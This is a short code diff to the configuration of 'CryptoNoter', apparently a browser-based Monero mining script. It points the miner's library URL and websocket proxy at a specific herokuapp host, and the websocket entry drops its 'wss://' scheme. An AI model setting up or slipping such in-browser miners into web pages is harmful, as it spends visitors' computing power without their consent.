@@ -1,7 +1,7 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]]
+    LIB_URL: "https://moneroxmr.herokuapp.com/web/lib/",
+    WEBSOCKET_SHARDS: [["moneroxmr.herokuapp.com"]]
 };
 var Module = {
     locateFile: (function (path) {
